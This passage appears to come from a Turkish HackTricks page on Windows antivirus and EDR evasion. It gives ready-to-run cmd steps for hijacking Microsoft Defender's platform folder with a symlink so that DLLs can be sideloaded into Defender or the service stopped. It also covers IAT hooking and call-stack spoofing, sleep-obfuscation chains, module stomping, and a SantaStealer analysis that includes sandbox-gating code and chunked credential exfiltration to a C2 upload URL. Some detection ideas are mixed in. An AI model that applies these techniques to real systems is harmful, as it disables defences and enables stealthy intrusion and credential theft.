- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Platform Version Folder Symlink Hijack ile Microsoft Defender Tampering

Windows Defender, çalışacağı platform’u şu konum altındaki alt klasörleri numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

En yüksek lexicographic version string’e sahip alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender service processes’lerini buradan başlatır (service/registry paths buna göre güncellenir). Bu seçim, directory reparse points (symlinks) dahil directory entries’e güvenir. Bir administrator bunu, Defender’ı attacker-writable bir path’e yönlendirmek ve DLL sideloading veya service disruption elde etmek için kullanabilir.

Önkoşullar
- Local Administrator (Platform folder altında directories/symlinks oluşturmak için gerekir)
- Reboot etme veya Defender platform yeniden-seçimini tetikleme yeteneği (boot sırasında service restart)
- Yalnızca built-in tools gerekir (mklink)

Neden çalışır
- Defender kendi folders’ındaki writes’i engeller, ancak platform seçimi directory entries’e güvenir ve hedefin protected/trusted bir path’e çözümlendiğini doğrulamadan lexicographic olarak en yüksek version’u seçer.

Adım adım (örnek)
1) Mevcut platform folder’ın writable bir kopyasını hazırlayın, ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde, klasörünüze işaret eden daha yüksek sürümlü bir directory symlink oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)’in yönlendirilmiş path’ten çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni süreç yolunu `C:\TMP\AV\` altında ve bu konumu yansıtan servis yapılandırmasını/registry’yi gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri bırak/değiştirerek Defender’ın süreçlerinde code execute et. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink’i kaldırın; böylece bir sonraki başlangıçta yapılandırılan yol resolve olmaz ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Not: Bu teknik tek başına privilege escalation sağlamaz; admin rights gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion’ı C2 implant’inden çıkarıp target module’in kendisine taşıyabilir; bunun için Import Address Table (IAT)’ini hook’layıp seçili API’leri attacker-controlled, position‑independent code (PIC) üzerinden yönlendirebilirler. Bu, evasion’ı birçok kit’in sunduğu küçük API yüzeyinin ötesine geneller (ör. CreateProcessA) ve aynı korumaları BOFs ile post‑exploitation DLL’lere de genişletir.

High-level approach
- Target module’in yanına reflective loader kullanarak bir PIC blob yerleştirin (prepended veya companion). PIC self‑contained ve position‑independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR üzerinde gezinin ve hedef import’ların IAT entry’lerini (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ince PIC wrapper’lara patch’leyin.
- Her PIC wrapper, gerçek API address’ine tail‑call yapmadan önce evasion’ları çalıştırır. Tipik evasion’lar şunları içerir:
- Call öncesi memory mask/unmask (ör. beacon region’larını encrypt etmek, RWX→RX, page name/permission değiştirmek) ve ardından call sonrası restore etmek.
- Call-stack spoofing: benign bir stack oluşturup target API’ye geçiş yapmak, böylece call-stack analysis beklenen frame’leri çözer.
- Compatibility için, bir Aggressor script’in (veya eşdeğerinin) Beacon, BOFs ve post-ex DLL’ler için hangi API’lerin hook’lanacağını kaydedebilmesi adına bir interface export edin.

Why IAT hooking here
- Tool code’unu değiştirmeden veya Beacon’ın belirli API’leri proxy etmesine güvenmeden, hooked import’u kullanan her kod için çalışır.
- Post-ex DLL’leri kapsar: LoadLibrary* hook’lamak module load’larını (ör. System.Management.Automation.dll, clr.dll) intercept etmenizi ve aynı masking/stack evasion’ı onların API çağrılarına uygulamanızı sağlar.
- CreateProcessA/W’yi wrap ederek call-stack–based detection’lara karşı process-spawning post-ex komutlarının güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yaması relocations/ASLR sonrası ve import ilk kullanımından önce uygula. TitanLdr/AceLdr gibi reflective loaders, yüklenen module'ün DllMain sırasında hooking yapmayı gösterir.
- Wrapper'ları küçük ve PIC-safe tut; gerçek API'yi, patching öncesi yakaladığın original IAT value üzerinden ya da LdrGetProcedureAddress ile çöz.
- PIC için RW → RX geçişleri kullan ve writable+executable page'ler bırakmaktan kaçın.

Call‑stack spoofing stub
- Draugr‑style PIC stubs, sahte bir call chain oluşturur (return addresses benign modules içine) ve sonra gerçek API'ye pivot eder.
- Bu, Beacon/BOFs'tan sensitive APIs'lere canonical stack bekleyen detections'ları bozar.
- API prologue'dan önce beklenen frames içine inmek için stack cutting ve stack stitching teknikleriyle birlikte kullan.

Operational integration
- Reflective loader'ı post-ex DLL'lerin başına ekle, böylece PIC ve hooks DLL yüklenince otomatik initialize olur.
- Target APIs'leri kaydetmek için bir Aggressor script kullan; böylece Beacon ve BOFs aynı evasion path'ten kod değişikliği olmadan transparently faydalanır.

Detection/DFIR considerations
- IAT integrity: non-image (heap/anon) address'lere çözümlenen entries; import pointers için periyodik verification.
- Stack anomalies: loaded images'a ait olmayan return addresses; non-image PIC'ye ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: IAT içine process içi writes, import thunks'u değiştiren erken DllMain activity, load sırasında oluşturulan beklenmedik RX region'lar.
- Image-load evasion: Eğer LoadLibrary* hooking yapılıyorsa, memory masking events ile korele automation/clr assemblies'nin şüpheli yüklemelerini izle.

Related building blocks and examples
- Load sırasında IAT patching yapan reflective loaders (örn. TitanLdr, AceLdr)
- Memory masking hooks (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident bir PICO üzerinden import-time IAT hooks

Bir reflective loader'ı kontrol ediyorsan, `ProcessImports()` sırasında loader'ın `GetProcAddress` pointer'ını önce hook'ları kontrol eden custom bir resolver ile değiştirerek imports'ları **import sırasında** hook'layabilirsin:

- Geçici loader PIC kendini free ettikten sonra da yaşayan, kalıcı bir **resident PICO** (persistent PIC object) oluştur.
- Loader'ın import resolver'ını overwrite eden bir `setup_hooks()` function export et (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal imports'u atla ve `__resolve_hook(ror13hash(name))` gibi hash-based hook lookup kullan. Hook varsa onu döndür; yoksa gerçek `GetProcAddress`'e delege et.
- Crystal Palace `addhook "MODULE$Func" "hook"` entries ile hook targets'ları link time'da register et. Hook, resident PICO içinde yaşadığı için valid kalır.

Bu, yüklenen DLL'in code section'ını load sonrası patching yapmadan **import-time IAT redirection** sağlar.

### Target PEB-walking kullanıyorsa hook yapılabilir imports'u zorlamak

Import-time hooks yalnızca function target'ın IAT'sinde gerçekten varsa tetiklenir. Bir module APIs'leri PEB-walk + hash ile çözümlüyorsa (import entry yoksa), loader'ın `ProcessImports()` yolunun onu görmesi için gerçek bir import zorla:

- Hash'li export resolution'ı (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştir.
- Compiler bir IAT entry üretir; böylece reflective loader imports'ları çözerken interception mümkün olur.

### Sleep/idle obfuscation için `Sleep()` patch'lemeden Ekko-style yöntem

`Sleep` patch'lemek yerine, implant'ın kullandığı **gerçek wait/IPC primitive'lerini** hook'la (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Uzun waits için, idle sırasında in-memory image'ı şifreleyen Ekko-style bir obfuscation chain içinde çağrıyı sar:

- `CreateTimerQueueTimer` kullanarak `NtContinue`'u crafted `CONTEXT` frames ile çağıran bir callback dizisi planla.
- Tipik chain (x64): image'ı `PAGE_READWRITE` yap → `advapi32!SystemFunction032` ile tam mapped image üzerinde RC4 encrypt et → blocking wait'i gerçekleştir → RC4 decrypt et → PE sections boyunca dolaşarak section başına permissions'ları **geri yükle** → completion signal ver.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame'e kopyala ve her adımı invoke etmek için register'ları (`Rip/Rcx/Rdx/R8/R9`) ayarla.

Operational detail: uzun waits için çağırana “success” döndür (örn. `WAIT_OBJECT_0`), böylece image masked durumdayken caller devam eder. Bu pattern module'ü idle windows sırasında scanner'lardan saklar ve klasik “patched `Sleep()`” signature'ından kaçınır.

Detection ideas (telemetry-based)
- `NtContinue`'a işaret eden `CreateTimerQueueTimer` callback'lerinin burst'leri.
- Büyük, contiguous image-sized buffer'lar üzerinde kullanılan `advapi32!SystemFunction032`.
- Ardından custom per-section permission restoration gelen geniş aralıklı `VirtualProtect`.

### Sleep-obfuscation gadget'ları için runtime CFG registration

CFG-enabled target'larda, `jmp [rbx]` veya `jmp rdi` gibi mid-function gadget'a yapılan ilk indirect jump genellikle process'i `STATUS_STACK_BUFFER_OVERRUN` ile crash eder; çünkü gadget module'ün CFG metadata'sında yoktur. Hardened process'ler içinde Ekko/Kraken-style chain'leri yaşatmak için:

- Chain'in kullandığı her indirect destination'ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` entries ile register et.
- Loaded image'lar (`ntdll`, `kernel32`, `advapi32`) içindeki address'ler için `MEMORY_RANGE_ENTRY` **image base**'ten başlamalı ve **full image size**'ı kapsamalıdır.
- Manually mapped/PIC/stomped region'lar için bunun yerine **allocation base** ve allocation size kullan.
- Sadece dispatch gadget'ı değil, indirect olarak ulaşılan exports'ları (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) ve indirect target olacak attacker-controlled executable section'ları da işaretle.

Bu, ROP/JOP-style sleep chain'lerini “yalnızca non-CFG process'lerde çalışır” durumundan `/guard:cf` ile derlenmiş `explorer.exe`, browsers, `svchost.exe` ve diğer endpoint'ler için yeniden kullanılabilir bir primitive'e dönüştürür.

### Sleeping thread'ler için CET-safe stack spoofing

Tam `CONTEXT` replacement gürültülüdür ve CET Shadow Stack sistemlerde bozulabilir; çünkü spoofed bir `Rip` hâlâ hardware shadow stack ile uyuşmalıdır. Daha güvenli bir sleep-masking pattern'i:

- Aynı process içinde başka bir thread seç ve `NtQueryInformationThread` ile `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) oku.
- Current thread'in gerçek TEB/TIB'sini yedekle.
- Gerçek sleeping context'i `GetThreadContext` ile yakala.
- Spoof context'e yalnızca gerçek `Rip`'i kopyala, spoofed `Rsp`/stack state'i olduğu gibi bırak.
- Sleep window sırasında spoof thread'in `NT_TIB`'ini current TEB içine kopyala ki stack walker'lar meşru bir stack range içinde unwind etsin.
- Wait bittikten sonra orijinal TIB ve thread context'i geri yükle.

Bu, CET-consistent instruction pointer'ı korurken unwind'leri doğrulamak için TEB stack metadata'sına güvenen EDR stack walker'ları yanıltır.

### APC-based alternatif: Kraken Mask

Timer-queue dispatch çok signature'lıysa, aynı sleep-encrypt-spoof-restore sequence suspended bir helper thread üzerinden queued APC'lerle çalıştırılabilir:

- Entrypoint olarak `NtTestAlert` ile bir helper thread oluştur.
- Hazırlanmış `CONTEXT` frames/APC'leri `NtQueueApcThread` ile queue et ve `NtAlertResumeThread` ile drain et.
- Default 64 KB thread stack'i tüketmemek için chain state'i helper stack yerine heap'te sakla.
- Start event'i atomik olarak signal etmek ve block etmek için `NtSignalAndWaitForSingleObject` kullan.
- Yarı-restore edilmiş bir stack'i scanner'ın yakalayabileceği race window'u azaltmak için TIB/context'i geri yüklemeden önce main thread'i suspend et (`NtSuspendThread` → restore → `NtResumeThread`).

Bu, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` signature'ını helper-thread/APC signature'ıyla değiştirir.

Additional detection ideas
- `NtSetInformationVirtualMemory` ile `VmCfgCallTargetInformation`, sleep'ler, waits veya APC dispatch'ten kısa süre önce.
- `GetThreadContext`/`SetThreadContext` etrafında `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe`.
- Current thread'in TEB/TIB stack bounds'una doğrudan writes'ı izleyen `NtQueryInformationThread`.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helpers'a ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain'leri.
- Signed modules içinde dispatch pivot'u olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget signature'larının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, payload'ları yeni bir sacrificial DLL yüklemek ya da bariz private executable memory allocate etmek yerine, hedef process içinde zaten mapped olan bir **DLL'nin `.text` section'ından** çalıştırır. Overwrite hedefi, process'in hâlâ ihtiyaç duyduğu code paths'i bozmadan payload'ı emebilecek **loaded, disk-backed image** olmalıdır.

### Reliable target selection

`uxtheme.dll` veya `comctl32.dll` gibi yaygın module'lere karşı naive stomping kırılgandır: DLL remote process'te yüklü olmayabilir ve fazla küçük bir code region process'i crash eder. Daha güvenilir bir workflow:

1. Target process modules'lerini enumerate et ve zaten loaded olan DLL'lerin yalnızca isimlerinden oluşan bir include list tut.
2. Payload'ı önce build et ve **exact byte size**'ını kaydet.
3. Candidate DLL'leri disk üzerinde scan et ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştır. Bu, file size'dan daha önemlidir çünkü memory'ye map edildiğinde executable section'ın boyutunu yansıtır.
4. **Export Address Table (EAT)**'i parse et ve stomp başlangıç offset'i olarak bir exported function RVA seç.
5. **Blast radius**'u hesapla: payload seçilen function boundary'yi aşarsa, memory'de onun ardından gelen adjacent exports'u overwrite eder.

Vahşi ortamda görülen tipik recon/selection helpers:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasyon notları
- `LoadLibrary`/beklenmeyen image yüklemelerinin telemetrisinden kaçınmak için uzak process içinde **zaten yüklenmiş** DLL’leri tercih edin.
- Hedef application tarafından nadiren çalıştırılan export’ları tercih edin; aksi halde normal code path’ler thread creation’dan önce veya sonra stomped byte’lara çarpabilir.
- Büyük implant’ler, shellcode embedding’i bir string literal’den, injector source içinde tam buffer’ın doğru temsil edilmesi için bir **byte-array/braced initializer**’a değiştirmeyi gerektirir.

Detection fikirleri
- Daha yaygın olan private RWX/RX allocations yerine, **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) içine remote writes.
- Bellekteki byte’ları disk üzerindeki backing file ile artık eşleşmeyen export entry point’leri.
- Execution’ın, ilk byte’ları yakın zamanda modified edilmiş meşru bir DLL export’u içinde başladığı remote threads veya context pivots.
- DLL `.text` pages’lerine karşı şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` sequence’leri ve ardından thread creation.

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) modern info-stealer’ların AV bypass, anti-analysis ve credential access’i tek bir workflow içinde nasıl birleştirdiğini gösterir.

### Keyboard layout gating & sandbox delay

- Bir config flag (`anti_cis`), `GetKeyboardLayoutList` ile yüklü keyboard layouts’u listeler. Eğer bir Cyrillic layout bulunursa, sample çalıştırıcılara geçmeden önce boş bir `CIS` marker bırakır ve sonlanır; böylece hariç tutulan locales üzerinde asla detonatе olmazken bir hunting artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Layered `check_antivm` logic

- Variant A process listesini tarar, her ismi özel bir rolling checksum ile hash’ler ve bunu debugger/sandbox için gömülü blocklists ile karşılaştırır; ayrıca checksum’u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini inceler (process-count alt sınırı, recent uptime), VirtualBox eklerini tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping’i saptamak için sleeps etrafında timing checks uygular. Herhangi bir tespit, modules başlatılmadan önce abort eder.

### Fileless helper + double ChaCha20 reflective loading

- Birincil DLL/EXE, disk’e bırakılan ya da memory içinde manuel map edilen bir Chromium credential helper gömer; fileless mode, import/relocation çözümlemelerini kendi yapar, böylece hiçbir helper artifact’i yazılmaz.
- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki adet 32-byte key + 12-byte nonce). Her iki geçişten sonra blob’u reflectively load eder (`LoadLibrary` olmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) tabanlı `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export’larını çağırır.
- ChromElevator rutinleri, canlı bir Chromium browser içine inject etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption anahtarlarını devralır ve ABE hardening’e rağmen passwords/cookies/credit cards verilerini doğrudan SQLite databases içinden decrypt eder.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosu üzerinde iterasyon yapar ve etkin her module (Telegram, Discord, Steam, screenshots, documents, browser extensions, vb.) için bir thread spawn eder. Her thread sonuçları shared buffers içine yazar ve ~45 saniyelik join window sonrasında file count’unu rapor eder.
- İşlem bittiğinde, her şey statically linked `miniz` library ile `%TEMP%\\Log.zip` olarak ziplenir. Ardından `ThreadPayload1` 15 saniye uyur ve arşivi `http://<C2>:6767/upload` adresine HTTP POST ile 10 MB chunk’lar halinde stream eder; browser `multipart/form-data` boundary’sini (`----WebKitFormBoundary***`) spoof eder. Her chunk `User-Agent: upload`, `auth: <build_id>`, opsiyonel `w: <campaign_tag>` ekler ve son chunk `complete: true` ekler, böylece C2 yeniden birleştirmenin tamamlandığını bilir.

## References


- [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)


{{#include ../banners/hacktricks-training.md}}
